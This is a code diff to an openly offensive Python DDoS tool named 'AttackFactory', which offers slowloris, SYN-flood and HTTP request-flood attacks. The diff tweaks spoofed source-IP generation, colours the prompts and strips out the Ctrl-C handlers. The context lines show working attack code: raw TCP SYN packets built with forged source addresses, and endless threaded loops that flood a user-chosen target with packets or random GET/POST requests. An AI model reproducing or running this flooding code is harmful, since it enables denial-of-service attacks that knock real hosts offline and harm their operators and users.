@@ -17,7 +17,7 @@ def fake_ip():
   skip = '127'
   rand = [0,0,0,0]
   for x in range(4):
-    rand[x] = randint(1,256)
+    rand[x] = randint(1,224)
     if rand[x] == skip :
       fake_ip()
   fkip = '%d.%d.%d.%d' % (rand[0],rand[1],rand[2],rand[3])
@@ -88,7 +88,7 @@ class Synflood(Thread):
 		ttl=64
 		protocol=IPPROTO_TCP
 		check=10
-		s_addr=inet_aton(self.ip)
+		s_addr = inet_aton(self.ip)
 		d_addr=inet_aton(self.tgt)
 
 		ihl_version = (version << 4) + ihl
@@ -112,7 +112,6 @@ class Synflood(Thread):
 		offset_res = (doff << 4)
 		tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
 		tcp_header=pack('!HHLLBBHHH',source,dest,seq,ack_seq,offset_res,tcp_flags,window,check,urg_prt)
-
 		src_addr = inet_aton(self.ip)
 		dst_addr = inet_aton(self.tgt)
 		place = 0
@@ -133,8 +132,6 @@ class Synflood(Thread):
 		try:
 			self.lock.acquire()
 			self.sock.sendto(packet,(self.tgt,0))
-		except KeyboardInterrupt:
-			sys.exit(cprint('[-] Canceled by user','red'))
 		except Exception as e:
 			cprint(e,'red')
 		finally:
@@ -145,15 +142,15 @@ def synflood_start():
     try:
         uid = os.getuid()
         if uid == 0:
-            print("[+] You have enough permission to run SYNflood attack :)")
+            print(colored("[+] You have enough permission to run SYNflood attack :)",'green'))
         else:
-            print("[!!] You don't have enough permissoin to run this script (Try with sudo)")
+            print(colored("[!!] You don't have enough permissoin to run this script (Try with sudo)",'red'))
     except:
-        print("[!!] Windows user dont have permission to run synflood attack ")
+        print(colored("[!!] Windows user dont have permission to run synflood attack ",'red'))
         exit(0)
-    tgt = input("AttackFactory@Specify~Targethost/IP~#$ ")
+    tgt = input(colored("AttackFactory@Specify~Targethost/IP~#$ ",'yellow'))
     tgt = check_tgt(tgt)
-    trd = input("AttackFactory@Specify~NumberOfThreads( Default : 1000 )~#$ : ")
+    trd = input(colored("AttackFactory@Specify~NumberOfThreads( Default : 1000 )~#$ : ",'yellow'))
     if trd == "":
         trd = "1000"
     synsock=socket(AF_INET,SOCK_RAW,IPPROTO_TCP)
@@ -161,15 +158,14 @@ def synflood_start():
     ts=[]
     threads=[]
     print (colored('[+] Started SYN Flood: ','blue')+colored(tgt,'red'))
+
     while True:
-        try:
-            for x in range(0,int(trd)):
-                thread=Synflood(tgt,fake_ip(),sock=synsock)
-                thread.setDaemon(True)
-                thread.start()
-                thread.join()
-        except KeyboardInterrupt:
-            sys.exit(cprint('[-] Canceled by user','red'))    
+        for x in range(0,int(trd)):
+            thread=Synflood(tgt,fake_ip(),sock=synsock)
+            thread.setDaemon(True)
+            thread.start()
+            thread.join()
+         
 #Requester class starts from here
 class Requester(Thread):
 	def __init__(self,tgt):
@@ -229,8 +225,6 @@ class Requester(Thread):
 				(url,http_header) = self.data()
 				method = choice(['get','post'])
 				reqter.request(method.upper(),url,None,http_header)
-		except KeyboardInterrupt:
-			sys.exit(cprint('[-] Canceled by user','red'))
 		except Exception as e:
 			print (e)
 		finally:
@@ -313,14 +307,12 @@ def request_start():
     threads = [];
     print (colored('[+] Started sending request to: ','blue')+colored(tgt,'red'));
     while True :
-        try:
-            for x in range(int(trd)):
-                t=Requester(tgt)
-                t.setDaemon(True)
-                t.start()
-                t.join()
-        except KeyboardInterrupt:
-            sys.exit(cprint('[-] Canceled by user','red')) 
+        for x in range(int(trd)):
+            t=Requester(tgt)
+            t.setDaemon(True)
+            t.start()
+            t.join()
+        
 
 def get_attack_table():
     attacks = ["slowloris DDos","SYNflood DDos","Requests DDos"]
@@ -362,8 +354,4 @@ def main():
     '''
     add_bots();add_useragent()
     print(colored(banner,'red'))
-    try:
-        get_attack_table()  
-    except KeyboardInterrupt:
-        print(colored("[-] Exiting by user ....",'red'))
-        exit(0)
+    get_attack_table()  
